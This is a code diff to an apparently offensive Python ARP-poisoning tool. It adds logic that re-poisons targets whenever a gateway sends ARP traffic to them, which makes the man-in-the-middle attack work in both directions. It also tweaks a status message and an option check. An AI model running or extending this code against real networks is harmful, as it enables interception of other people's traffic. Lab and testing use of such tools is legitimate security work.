@@ -120,7 +120,7 @@ def arp_poison(targets, gateways):
 
             # print("[*] end of ARP storm...") if options.verbose else 0
             if(options.silent and i >=2):
-                print("[*] Initial poison complete")
+                print("[*] Poison complete")
                 return
 
         except Exception as e:
@@ -141,6 +141,12 @@ def poison_confirm(targets, gateways):
                         if(pkt[ARP].pdst == gateway.ip):
                             arp_poison(targets, gateways)
                             print("ARP broadcast from " + pkt[ARP].psrc + " to " + pkt[ARP].pdst)
+                if(not options.oneway):
+                    if(pkt[ARP].pdst == target.ip):
+                        for gateway in gateways:
+                            if(pkt[ARP].psrc == gateway.ip):
+                                arp_poison(targets, gateways)
+                                print("ARP broadcast from " + pkt[ARP].psrc + " to " + pkt[ARP].pdst)
 
 
         # print("[*] Received ARP packet:")
@@ -169,7 +175,7 @@ def main():
             sys.exit(0)
         targets.append(type('obj', (object,), {"mac": target_mac, "ip": target}))
 
-    if len(options.gateways) > 0:
+    if options.gateways is not None:
         for gatewayAdr in options.gateways:
             gateway = format(gatewayAdr)
             gateway_mac = get_mac(gateway)
